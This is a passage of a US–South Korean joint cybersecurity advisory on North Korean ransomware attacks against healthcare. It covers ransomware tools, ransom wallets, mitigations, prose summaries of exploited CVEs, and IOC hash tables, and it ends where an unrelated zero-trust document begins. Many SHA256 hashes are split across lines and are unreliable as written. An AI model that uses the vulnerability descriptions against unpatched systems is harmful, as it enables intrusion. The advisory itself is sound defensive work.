responsible for collecting victim information and sending it to the remote host
controlled by the actors [TA0010].
Employ Various Ransomware Tools [TA0040]. Actors have used privately
developed ransomware, such as Maui and H0lyGh0st [T1486]. Actors have also
been observed using or possessing publically available tools for encryption, such
as BitLocker, Deadbolt, ech0raix, GonnaCry, Hidden Tear, Jigsaw, LockBit 2.0,
My Little Ransomware, NxRansomware, Ryuk, and YourRansom [T1486]. In
some cases, DPRK actors have portrayed themselves as other ransomware
groups, such as the REvil ransomware group. For IOCs associated with Maui
and H0lyGh0st ransomware usage, please see Appendix B.
Demand Ransom in Cryptocurrency. DPRK cyber actors have been observed
setting ransoms in bitcoin [T1486]. Actors are known to communicate with victims
via Proton Mail email accounts. For private companies in the healthcare sector,
actors may threaten to expose a company
s proprietary data to competitors if
ransoms are not paid. Bitcoin wallet addresses possibly used by DPRK cyber
actors include:
1MTHBCrBKYEthfa16zo9kabt4f9jMJz8Rm
bc1q80vc4yjgg6umedkut3e9mhehxl4q4dcjjyzh59
1J8spy62o7z2AjQxoUpiCGnBh5cRWKVWJC
16ENLdHbnmDcEV8iqN4vuyZHa7sSdYRh76
bc1q3wzxvu8yhs8h7mlkmf7277wyklkah9k4sm9anu
bc1q8xyt4jxhw7mgqpwd6qfdjyxgvjeuz57jxrvgk9
1NqihEqYaQaWiZkPVdSMiTbt7dTy1LMxgX
bc1qxrpevck3pq1yzrx2pq2rkvkvy0jnm56nzjv6pw
14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk
1KCwfCUgnSy3pzNX7U1i5NwFzRtth4bRBc
16sYqXancDDiijcuruZecCkdBDwDf4vSEC
1N6JphHFaYmYaokS5xH31Z67bvk4ykd9CP
LZ1VNJfn6mWjPzkCyoBvqWaBZYXAwn135
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
1KmWW6LgdgykBBrSXrFu9kdoHz95Fe9kQF
1FX4W9rrG4F3Uc7gJ18GCwGab8XuW8Ajy2
bc1qlqgu2l2kms5338zuc95kxavctzyy0v705tpvyc
bc1qy6su7vrh7ts5ng2628escmhr98msmzg62ez2sp
bc1q8t69gpxsezdcr8w6tfzp3jeptq4tcp2g9d0mwy
bc1q9h7yj79sqm4t536q0fdn7n4y2atsvvl22m28ep
bc1qj6y72rk039mqpgtcy7mwjd3eum6cx6027ndgmd
bc1qcp557vltuu3qc6pk3ld0ayagrxuf2thp3pjzpe
bc1ql8wsflrjf9zlusauynzjm83mupq6c9jz9vnqxg
bc1qx60ec3nfd5yhsyyxkzkpts54w970yxj84zrdck
bc1qunqnjdlvqkjuhtclfp8kzkjpvdz9qnk898xczp
bc1q6024d73h48fnhwswhwt3hqz2lzw6x99q0nulm4
bc1qwdvexlyvg3mqvqw7g6l09qup0qew80wjj9jh7x
bc1qavrtge4p7dmcrnvhlvuhaarx8rek76wxyk7dgg
bc1qagaayd57vr25dlqgk7f00nhz9qepqgnlnt4upu
bc1quvnaxnpqlzq3mdhfddh35j7e7ufxh3gpc56hca
bc1qu0pvfmtxawm8s99lcjvxapungtsmkvwyvak6cs
bc1qg3zlxxhhcvt6hkuhmqml8y9pas76cajcu9ltdl
bc1qn7a3g23nzpuytchyyteyhkcse84cnylznl3j32
bc1qhfmqstxp3yp9muvuz29wk77vjtdyrkff4nrxpu
bc1qnh8scrvuqvlzmzgw7eesyrmtes9c5m78duetf3
bc1q7qry3lsrphmnw3exs7tkwzpvzjcxs942aq8n0y
bc1qcmlcxfsy0zlqhh72jvvc4rh7hvwhx6scp27na0
bc1q498fn0gauj2kkjsg35mlwk2cnxhaqlj7hkh8xy
bc1qnz4udqkumjghnm2a3zt0w3ep8fwdcyv3krr3jq
bc1qk0saaw7p0wrwla6u7tfjlxrutlgrwnudzx9tyw
bc1qyue2pgjk09ps7qvfs559k8kee3jkcw4p4vdp57
bc1q6qfkt06xmrpclht3acmq00p7zyy0ejydu89zwv
bc1qmge6a7sp659exnx78zhm9zgrw88n6un0rl9trs
bc1qcywkd7zqlwmjy36c46dpf8cq6ts6wgkjx0u7cn
Mitigations
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals
(CPGs) developed by CISA and the U.S. National Institute of Standards and
Technology (NIST). The CPGs provide a minimum set of practices and protections that
CISA and NIST recommend all organizations implement. CISA and NIST based the
CPGs on existing cybersecurity frameworks and guidance to protect against the most
common and impactful threats, tactics, techniques, and procedures. For more
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
information on the CPGs, including additional recommended baseline protections, see
cisa.gov/cpg.
The authoring agencies urge HPH organizations to:
 Limit access to data by authenticating and encrypting connections (e.g., using
public key infrastructure certificates in virtual private network (VPN) and transport
layer security (TLS) connections) with network services, Internet of Things (IoT)
medical devices, and the electronic health record system [CPG 3.3].
Implement the principle of least privilege by using standard user accounts on
internal systems instead of administrative accounts [CPG 1.5], which grant
excessive system administration privileges.
Turn off weak or unnecessary network device management interfaces, such as
Telnet, SSH, Winbox, and HTTP for wide area networks (WANs) and secure with
strong passwords and encryption when enabled.
Protect stored data by masking the permanent account number (PAN) when
displayed and rendering it unreadable when stored
through cryptography, for
example.
Secure the collection, storage, and processing practices for personally
identifiable information (PII)/protected health information (PHI), per regulations
such as the Health Insurance Portability and Accountability Act of 1996 (HIPAA).
Implementing HIPAA security measures could prevent the introduction of
malware to the system [CPG 3.4].
o Secure PII/ PHI at collection points and encrypt the data at rest and in transit
using technologies, such as TLS. Only store personal patient data on internal
systems that are protected by firewalls, and ensure extensive backups are
available.
o Create and regularly review internal policies that regulate the collection,
storage, access, and monitoring of PII/PHI.
Implement and enforce multi-layer network segmentation with the most critical
communications and data resting on the most secure and reliable layer [CPG
8.1].
Use monitoring tools to observe whether IoT devices are behaving erratically due
to a compromise [CPG 3.1].
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
In addition, the authoring agencies urge all organizations, including HPH Sector
organizations, to apply the following recommendations to prepare for and mitigate
ransomware incidents:
Maintain isolated backups of data, and regularly test backup and
restoration [CPG 7.3]. These practices safeguard an organization
s continuity of
operations or at least minimize potential downtime from a ransomware incident
and protect against data losses.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or
deleted), and covers the entire organization
s data infrastructure.
Create, maintain, and exercise a basic cyber incident response plan and
associated communications plan that includes response procedures for a
ransomware incident [CPG 7.1, 7.2].
o Organizations should also ensure their incident response and
communications plans include data breach incidents response and
notification procedures. Ensure the notification procedures adhere to
applicable laws.
o See the CISA-Multi-State Information Sharing and Analysis Center (MSISAC) Joint Ransomware Guide and CISA Fact Sheet Protecting Sensitive
and Personal Information from Ransomware-Caused Data Breaches for
information on creating a ransomware response checklist and planning
and responding to ransomware-caused data breaches.
Install updates for operating systems, software, and firmware as soon as
they are released [CPG 5.1]. Timely patching is one of the most efficient and
cost-effective steps an organization can take to minimize its exposure to
cybersecurity threats. Regularly check for software updates and end-of-life
notifications and prioritize patching known exploited vulnerabilities. Consider
leveraging a centralized patch management system to automate and expedite
the process.
If you use Remote Desktop Protocol (RDP), or other potentially risky
services, secure and monitor them closely [CPG 5.4].
o Limit access to resources over internal networks, especially by restricting
RDP and using virtual desktop infrastructure. After assessing risks, if RDP
is deemed operationally necessary, restrict the originating sources, and
require phishing-resistant multifactor authentication (MFA) to mitigate
credential theft and reuse [CPG 1.3]. If RDP must be available externally,
use a VPN, virtual desktop infrastructure, or other means to authenticate
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
and secure the connection before allowing RDP to connect to internal
devices. Monitor remote access/RDP logs, enforce account lockouts after
a specified number of attempts to block brute force campaigns, log RDP
login attempts, and disable unused remote access/RDP ports [CPG 1.1,
3.1].
o Ensure devices are properly configured and that security features are
enabled. Disable ports and protocols not in use for a business purpose
(e.g., RDP Transmission Control Protocol port 3389).
o Restrict the Server Message Block (SMB) protocol within the network to
only access necessary servers and remove or disable outdated versions
of SMB (i.e., SMB version 1). Threat actors use SMB to propagate
malware across organizations.
o Review the security posture of third-party vendors and those
interconnected with your organization. Ensure all connections between
third-party vendors and outside software or hardware are monitored and
reviewed for suspicious activity [CPG 5.6, 6.2].
o Implement application control policies that only allow systems to execute
known and permitted programs [CPG 2.1].
o Open document readers in protected viewing modes to help prevent active
content from running.
Implement a user training program and phishing exercises [CPG 4.3] to
raise awareness among users about the risks of visiting websites, clicking on
links, and opening attachments. Reinforce the appropriate user response to
phishing and spearphishing emails.
Require phishing-resistant MFA for as many services as possible [CPG
1.3]
particularly for webmail, VPNs, accounts that access critical systems, and
privileged accounts that manage backups.
Use strong passwords [CPG 1.4] and avoid reusing passwords for multiple
accounts. See CISA Tip Choosing and Protecting Passwords and National
Institute of Standards and Technology (NIST) Special Publication 800-63B:
Digital Identity Guidelines for more information.
Require administrator credentials to install software [CPG 1.5].
Audit user accounts with administrative or elevated privileges [CPG 1.5]
and configure access controls with least privilege in mind.
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
Install and regularly update antivirus and antimalware software on all
hosts.
Only use secure networks. Consider installing and using a VPN.
Consider adding an email banner to messages coming from outside your
organizations [CPG 8.3] indicating that they are higher risk messages.
Consider participating in CISA
s no-cost Automated Indicator Sharing (AIS)
program to receive real-time exchange of machine-readable cyber threat
indicators and defensive measures.
If a ransomware incident occurs at your organization:
Follow your organization
s ransomware response checklist.
Scan backups. If possible, scan backup data with an antivirus program to check
that it is free of malware. This should be performed using an isolated, trusted
system to avoid exposing backups to potential compromise.
U.S. organizations: Follow the notification requirements as outlined in your
cyber incident response plan. Report incidents to appropriate authorities; in the
U.S., this would include the FBI at a local FBI Field Office, CISA at
cisa.gov/report, or the U.S. Secret Service (USSS) at a USSS Field Office.
South Korean organizations: Please report incidents to NIS, KISA (Korea
Internet & Security Agency), and KNPA (Korean National Police Agency).
o NIS (National Intelligence Service)
 Telephone : 111
 https://www.nis.go.kr
o KISA (Korea Internet & Security Agency)
 Telephone : 118 (Consult Service)
 https://www.boho.or.kr/consult/ransomware.do
o KNPA (Korean National Police Agency)
 Electronic Cybercrime Report & Management System:
https://ecrm.police.go.kr/minwon/main
Apply incident response best practices found in the joint Cybersecurity Advisory,
Technical Approaches to Uncovering and Remediating Malicious Activity,
developed by CISA and the cybersecurity authorities of Australia, Canada, New
Zealand, and the United Kingdom.
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
Resources
Stairwell provided a YARA rule to identify Maui ransomware, and a Proof of Concept
public RSA key extractor at the following link:
https://www.stairwell.com/news/threat-research-report-maui-ransomware/
Request For Information
The FBI is seeking any information that can be shared, to include boundary logs
showing communication to and from foreign IP addresses, bitcoin wallet information, the
decryptor file, and/or benign samples of encrypted files. As stated above, the authoring
agencies discourage paying ransoms. Payment does not guarantee files will be
recovered and may embolden adversaries to target additional organizations, encourage
other criminal actors to engage in the distribution of ransomware, and/or fund illicit
activities. However, the agencies understand that when victims are faced with an
inability to function, all options are evaluated to protect shareholders, employees, and
customers.
Regardless of whether you or your organization decide to pay a ransom, the authoring
agencies urge you to promptly report ransomware incidents using the contact
information above.
Acknowledgements
NSA, FBI, CISA, and HHS would like to thank ROK NIS and DSA for their contributions
to this CSA.
Disclaimer of endorsement
The information and opinions contained in this document are provided "as is" and without any warranties or
guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark,
manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United
States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Trademark recognition
Microsoft Threat Intelligence Center is a registered trademark of Microsoft Corporation. Apache
, Sonicwall, and
Apache Log4j are trademarks of Apache Software Foundation. TerraMaster Operating System is a registered
trademark of Octagon Systems.
Purpose
This document was developed in furtherance of the authors
 cybersecurity missions, including their responsibilities to
identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This
information may be shared broadly to reach all appropriate stakeholders.
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
Contact
NSA Client Requirements / General Cybersecurity Inquiries: CybersecurityReports@nsa.gov
Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
To report incidents and anomalous activity related to information found in this Joint Cybersecurity Advisory, contact
CISA
s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870 or your local FBI field office at
www.fbi.gov/contact-us/field. When available, please include the following information regarding the incident: date,
time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity;
the name of the submitting company or organization; and a designated point of contact.
Media Inquiries / Press Desk:
NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov
CISA Media Relations, 703-235-2010, CISAMedia@cisa.dhs.gov
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
Appendix A: CVE Details
CVE-2021-44228
CVSS 3.0: 10 (Critical)
Vulnerability Description
Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3,
and 2.3.1) JNDI features used in configuration, log messages, and parameters do not
protect against attacker controlled LDAP and other JNDI related endpoints. An
attacker who can control log messages or log message parameters can execute
arbitrary code loaded from LDAP servers when message lookup substitution is
enabled. From log4j 2.15.0, this behavior has been disabled by default. From version
2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely
removed. Note that this vulnerability is specific to log4j-core and does not affect
log4net, log4cxx, or other Apache Logging Services projects.
Recommended Mitigations
Apply patches provided by vendor and perform required system updates.
Detection Methods
See vendors
 Guidance For Preventing, Detecting, and Hunting for Exploitation of the
Log4j 2 Vulnerability.
Vulnerable Technologies and Versions
There are numerous vulnerable technologies and versions associated with CVE-202144228. For a full list, please check https://nvd.nist.gov/vuln/detail/CVE-2021-44228.
See https://nvd.nist.gov/vuln/detail/CVE-2021-44228 for more information.
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
CVE-2021-20038
CVSS 3.0: 9.8 (Critical)
Vulnerability Description
A Stack-based buffer overflow vulnerability in SMA100 Apache httpd server's mod_cgi
module environment variables allows a remote unauthenticated attacker to potentially
execute code as a 'nobody' user in the appliance. This vulnerability affected SMA 200,
210, 400, 410 and 500v appliances firmware 10.2.0.8-37sv, 10.2.1.1-19sv, 10.2.1.224sv and earlier versions.
Recommended Mitigations
Apply all appropriate vendor updates
Upgrade to:
 SMA 100 Series - (SMA 200, 210, 400, 410, 500v (ESX, Hyper-V, KVM, AWS,
Azure):
 SonicWall SMA100 build versions 10.2.0.9-41sv or later
 SonicWall SMA100 build versions 10.2.1.3-27sv or later
System administrators should refer to the SonicWall Security Advisories in the
reference section to determine affected applications/systems and appropriate fix
actions.
Support for 9.0.0 firmware ended on 10/31/2021. Customers still using that firmware
are requested to upgrade to the latest 10.2.x versions.
Vulnerable Technologies and Versions
Sonicwall Sma 200 Firmware 10.2.0.8-37Sv
Sonicwall Sma 200 Firmware 10.2.1.1-19Sv
Sonicwall Sma 200 Firmware 10.2.1.2-24Sv
Sonicwall Sma 210 Firmware 10.2.0.8-37Sv
Sonicwall Sma 210 Firmware 10.2.1.1-19Sv
Sonicwall Sma 210 Firmware 10.2.1.2-24Sv
Sonicwall Sma 410 Firmware 10.2.0.8-37Sv
Sonicwall Sma 410 Firmware 10.2.1.1-19Sv
Sonicwall Sma 410 Firmware 10.2.1.2-24Sv
Sonicwall Sma 400 Firmware 10.2.0.8-37Sv
Sonicwall Sma 400 Firmware 10.2.1.1-19Sv
Sonicwall Sma 400 Firmware 10.2.1.2-24Sv
Sonicwall Sma 500V Firmware 10.2.0.8-37Sv
Sonicwall Sma 500V Firmware 10.2.1.1-19Sv
Sonicwall Sma 500V Firmware 10.2.1.2-24Sv
See https://nvd.nist.gov/vuln/detail/CVE-2021-20038 for more information.
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
CVE-2022-24990
CVSS 3.x: N/A
Vulnerability Description
The TerraMaster OS Unauthenticated Remote Command Execution via PHP Object
Instantiation Vulnerability is characterized by scanning activity targeting a flaw in the
script enabling a remote adversary to execute commands on the target endpoint. The
vulnerability is created by improper input validation of the webNasIPS component in
the api.php script and resides on the TNAS device appliances' operating system
where users manage storage, backup data, and configure applications. By exploiting
the script flaw a remote unauthenticated attacker can pass specially crafted data to
the application and execute arbitrary commands on the target system. This may result
in complete compromise of the target system, including the exfiltration of information.
TNAS devices can be chained to acquire unauthenticated remote code execution with
highest privileges.
Recommended Mitigations
Install relevant vendor patches. This vulnerability was patched in TOS version 4.2.30
Vulnerable Technologies and Versions
TOS v 4.2.29
See https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tosunauthenticated-remote-command-execution-via-php-object-instantiation/ and
https://forum.terra-master.com/en/viewtopic.php?t=3030 for more information.
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
Appendix B: Indicators of Compromise (IOCs)
The IOC section includes hashes and IP addresses for the Maui and H0lyGh0st
ransomware variants
as well as custom malware implants assumedly developed by
DPRK cyber actors, such as remote access trojans (RATs), loaders, and other tools
that enable subsequent deployment of ransomware. For additional Maui IOCs, see joint
CSA North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the
Healthcare and Public Health Sector.
Table 2 lists MD5 and SHA256 hashes associated with malware implants, RATs, and
other tools used by DPRK cyber actors, including tools that drop Maui ransomware files.
Table 2: File names and hashes of malicious implants, RATs, and tools
MD5Hash
079b4588eaa99a1e802adf5e0b26d8aa
0e9e256d8173854a7bc26982b1dde783
12c15a477e1a96120c09a860c9d479b3
131fc4375971af391b459de33f81c253
17c46ed7b80c2e4dbea6d0e88ea0827c
1875f6a68f70bee316c8a6eda9ebf8de
1a74c8d8b74ca2411c1d3d22373a6769
1f6d9f8fbdbbd4e6ed8cd73b9e95a928
2d02f5499d35a8dffb4c8bc0b7fec5c2
2e18350194e59bc6a2a3f6d59da11bd8
3bd22e0ac965ebb6a18bb71ba39e96dc
40f21743f9cb927b2c84ecdb7dfb14a6
4118d9adce7350c3eedeb056a3335346
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
SHA256Hash
f67ee77d6129bd1bcd5d856c0fc5314169
b946d32b8abaa4e680bb98130b38e7
-6263e421e397db821669420489d2d3084
f408671524fd4e1e23165a16dda2225
-b9af4660da00c7fa975910d0a19fda0720
31c15fad1eef935a609842c51b7f7d
672ec8899b8ee513dbfc4590440a61023
846ddc2ca94c88ae637144305c497e7
ba8f9e7afe5f78494c111971c39a89111ef
9262bf23e8a764c6f65c818837a44
4f089afa51fd0c1b2a39cc11cedb3a4a32
6111837a5408379384be6fe846e016
830207029d83fd46a4a89cd623103ba23
21b866428aa04360376e6a390063570
655aa64860f1655081489cf85b77f72a49
de846a99dd122093db4018434b83ae
6b7f566889b80d1dba4f92d5e2fb2f5ef24
f57fcfd56bb594978dffe9edbb9eb
5081f54761947bc9ce4aa2a259a0bd60b
4ec03d32605f8e3635c4d4edaf48894
5b7ecf7e9d0715f1122baf4ce745c5fcd76
9dee48150616753fec4d6da16e99e
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
43e756d80225bdf1200bc34eef5adca8
47791bf9e017e3001ddc68a7351ca2d6
505262547f8879249794fc31eea41fc6
5130888a0ad3d64ad33c65de696d3fa2
58ad3103295afcc22bde8d81e77c282f
5be1e382cd9730fbe386b69bd8045ee7
5c6f9c83426c6d33ff2d4e72c039b747
640e70b0230dc026eff922fb1e44c2ea
67f4dad1a94ed8a47283c2c0c05a7594
70652edadedbacfd30d33a826853467d
739812e2ae1327a94e441719b885bd19
76c3d2092737d964dfd627f1ced0af80
802e7d6e80d7a60e17f9ffbd62fcbbeb
827103a6b6185191fd5618b7e82da292
830bc975a04ab0f62bfedf27f7aca673
85995257ac07ae5a6b4a86758a2283d7
85f6e3e3f0bdd0c1b3084fc86ee59d19
87a6bda486554ab16c82bdfb12452e8b
891db50188a90ddacfaf7567d2d0355d
894de380a249e677be2acb8fbdfba2ef
8b395cc6ecdec0900facf6e93ec48fbb
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
afb2d4d88f59e528f0e388705113ae54b7
b97db4f03a35ae43cc386a48f263a0
863b707873f7d653911e46885e261380b
410bb3bf6b158daefb47562e93cb657
f32f6b229913d68daad937cc72a57aa452
91a9d623109ed48938815aa7b6005c
c92c1f3e77a1876086ce530e87aa9c1f9c
bc5e93c5e755b29cad10a2f3991435
18b75949e03f8dcad513426f1f9f3ca209d
779c24cd4e941d935633b1bec00cb
5ad106e333de056eac78403b033b89c58
b4c4bdda12e2f774625d47ccfd3d3ae
a3b7e88d998078cfd8cdf37fa5454c45f6c
bd65f4595fb94b2e9c85fe767ad47
6319102bac226dfc117c3c9e620cd99c7e
afbf3874832f2ce085850aa042f19c
3fe624c33790b409421f4fa2bb8abfd701d
f2231a959493c33187ed34bec0ae7
196fb1b6eff4e7a049cea323459cfd6c0e3
900d8d69e1d80bffbaabd24c06eba
6122c94cbfa11311bea7129ecd5aea6fae
6c51d23228f7378b5f6b2398728f67
bffe910904efd1f69544daa9b72f2a70fb29
f73c51070bde4ea563de862ce4b1
87bdb1de1dd6b0b75879d8b8aef80b562
ec4fad365d7abbc629bcfc1d386afa6
---f1576627e8130e6d5fde0dbe3dffcc8bc9e
ef1203d15fcf09cd877ced1ccc72a
980bb08ef3e8afcb8c0c1a879ec11c41b2
9fd30ac65436495e69de79c555b2be
0837dd54268c373069fc5c1628c6e3d75e
b99c3b3efc94c45b73e2cf9a6f3207
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
92a6c017830cda80133bf97eb77d3292
9b0e7c460a80f740d455a7521f0eada1
9b9d4cb1f681f19417e541178d8c75d7
a1f9e9f5061313325a275d448d4ddd59
a452a5f693036320b580d28ee55ae2a3
a6e1efd70a077be032f052bb75544358
ad4eababfe125110299e5a24be84472e
b1c1d28dc7da1d58abab73fa98f60a83
b6f91a965b8404d1a276e43e61319931
bdece9758bf34fcad9cba1394519019b
c3850f4cc12717c2b54753f8ca5d5e0e
c50b839f2fc3ce5a385b9ae1c05def3a
cf236bf5b41d26967b1ce04ebbdb4041
d0e203e8845bf282475a8f816340f2e8
ddb1f970371fa32faae61fc5b8423d4b
f2f787868a3064407d79173ac5fc0864
fda3a19afa85912f6dc8452675245d6b
----
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
d1aba3f95f11fc6e5fec7694d188919555b
7ff097500e811ff4a5319f8f230be
45d8ac1ac692d6bb0fe776620371fca02b
60cac8db23c4cc7ab5df262da42b78
f5f6e538001803b0aa008422caf2c3c2a7
9b2eeee9ddc7feda710e4aba96fea4
dfdd72c9ce1212f9d9455e2bca5a327c88
d2d424ea5c086725897c83afc3d42d
99b0056b7cc2e305d4ccb0ac0a8a270d3f
ceb21ef6fc2eb13521a930cea8bd9f
3b9fe1713f638f85f20ea56fd09d20a96cd
6d288732b04b073248b56cdaef878
a557a0c67b5baa7cf64bd4d42103d3b285
2f67acf96b4c5f14992c1289b55eaa
38491f48d0cbaab7305b5ddca64ba41a2b
eb89d81d5fb920e67d0c7334c89131
-9d6de05f9a3e62044ad9ae66111308ccb9
ed2ee46a3ea37d85afa92e314e7127
99b448e91669b92c2cc3417a4d9711209
509274dab5d7582baacfab5028a818c
458d258005f39d72ce47c111a7d17e8c52
fe5fc7dd98575771640d9009385456
60425a4d5ee04c8ae09bfe28ca33bf9e76
a43f69548b2704956d0875a0f25145
f6375c5276d1178a2a0fe1a16c5668ce52
3e2f846c073bf75bb2558fdec06531
dda53eee2c5cb0abdbf5242f5e82f4de83
898b6a9dd8aa935c2be29bafc9a469
92adc5ea29491d9245876ba0b29573936
33c9998eb47b3ae1344c13a44cd59ae
56925a1f7d853d814f80e98a1c4890b0a6
a84c83a8eded34c585c98b2df6ab19
0054147db54544d77a9efd9baf5ec96a80
b430e170d6e7c22fcf75261e9a3a71
151ab3e05a23e9ccd03a6c49830dabb9e
9281faf279c31ae40b13e6971dd2fb8
1c926fb3bd99f4a586ed476e4683163892
f3958581bf8c24235cd2a415513b7f
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
1f8dcfaebbcd7e71c2872e0ba2fc6db81d6
51cf654a21d33c78eae6662e62392
f226086b5959eb96bd30dec0ffcbf0f0918
6cd11721507f416f1c39901addafb
23eff00dde0ee27dabad28c1f4ffb8b09e8
76f1e1a77c1e6fb735ab517d79b76
586f30907c3849c363145bfdcdabe3e2e4
688cbd5688ff968e984b201b474730
8ce219552e235dcaf1c694be122d6339e
d4ff8df70bf358cd165e6eb487ccfc5
90fb0cd574155fd8667d20f97ac464eca67
bdb6a8ee64184159362d45d79b6a4
c2904dc8bbb569536c742fca0c51a766e8
36d0da8fac1c1abd99744e9b50164f
ca932ccaa30955f2fffb1122234fb1524f7d
e3a8e0044de1ed4fe05cab8702a5
f6827dc5af661fbb4bf64bc625c78283ef8
36c6985bb2bfb836bd0c8d5397332
f78cabf7a0e7ed3ef2d1c976c1486281f56
a6503354b87219b466f2f7a0b65c4
-----------
Table 3 lists MD5 and SHA256 hashes are associated with Maui Ransomware files.
Table 3: File names and hashes of Maui ransomware files
MD5 Hash
4118d9adce7350c3eedeb056a3335346
9b0e7c460a80f740d455a7521f0eada1
fda3a19afa85912f6dc8452675245d6b
2d02f5499d35a8dffb4c8bc0b7fec5c2
c50b839f2fc3ce5a385b9ae1c05def3a
a452a5f693036320b580d28ee55ae2a3
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
SHA256 Hash
5b7ecf7e9d0715f1122baf4ce745c5fcd76
9dee48150616753fec4d6da16e99e
45d8ac1ac692d6bb0fe776620371fca02b
60cac8db23c4cc7ab5df262da42b78
56925a1f7d853d814f80e98a1c4890b0a6
a84c83a8eded34c585c98b2df6ab19
830207029d83fd46a4a89cd623103ba232
1b866428aa04360376e6a390063570
458d258005f39d72ce47c111a7d17e8c52
fe5fc7dd98575771640d9009385456
99b0056b7cc2e305d4ccb0ac0a8a270d3f
ceb21ef6fc2eb13521a930cea8bd9f
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
a6e1efd70a077be032f052bb75544358
802e7d6e80d7a60e17f9ffbd62fcbbeb
3b9fe1713f638f85f20ea56fd09d20a96cd6
d288732b04b073248b56cdaef878
87bdb1de1dd6b0b75879d8b8aef80b562e
c4fad365d7abbc629bcfc1d386afa6
0054147db54544d77a9efd9baf5ec96a80b
430e170d6e7c22fcf75261e9a3a71
Table 4 lists MD5 and SHA256 hashes associated with H0lyGh0st Ransomware files.
Table 4: File names and hashes of H0lyGh0st ransomware files
SHA256 Hash
99fc54786a72f32fd44c7391c2171ca31e72ca52725c68e2dde94d04c286fccd*
F8fc2445a9814ca8cf48a979bff7f182d6538f4d1ff438cf259268e8b4b76f86*
Bea866b327a2dc2aa104b7ad7307008919c06620771ec3715a059e675d9f40af*
6e20b73a6057f8ff75c49e1b7aef08abfcfe4e418e2c1307791036f081335c2d
f4d10b08d7dacd8fe33a6b54a0416eecdaed92c69c933c4a5d3700b8f5100fad
541825cb652606c2ea12fd25a842a8b3456d025841c3a7f563655ef77bb67219
2d978df8df0cf33830aba16c6322198e5889c67d49b40b1cb1eb236bd366826d
414ed95d14964477bebf86dced0306714c497cde14dede67b0c1425ce451d3d7
Df0c7bb88e3c67d849d78d13cee30671b39b300e0cda5550280350775d5762d8
MD5 Hash
a2c2099d503fcc29478205f5aef0283b
9c516e5b95a7e4169ecbd133ed4d205f
d6a7b5db62bf7815a10a17cdf7ddbd4b
c6949a99c60ef29d20ac8a9a3fb58ce5
4b20641c759ed563757cdd95c651ee53
25ee4001eb4e91f7ea0bc5d07f2a9744
18126be163eb7df2194bb902c359ba8e
eaf6896b361121b2c315a35be837576d
e4ee611533a28648a350f2dab85bb72a
e268cb7ab778564e88d757db4152b9fa
* From Microsoft blog post on h0lygh0st
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
National Security Agency | Cybersecurity Information Sheet
Advancing Zero Trust Maturity Throughout the
Device Pillar
Executive summary
Continued cyber incidents have called attention to the immense challenges of ensuring
effective cybersecurity across the federal government, as with many large enterprises,
and demonstrate that 
business as usual
 approaches are no longer sufficient to defend
the nation from cyber threats. The government can no longer depend only on traditional
strategies and defenses to protect critical systems and data. [1]
A modernized cybersecurity framework
Zero Trust
integrates visibility from multiple
vantage points, makes risk-aware access decisions, and automates detection and
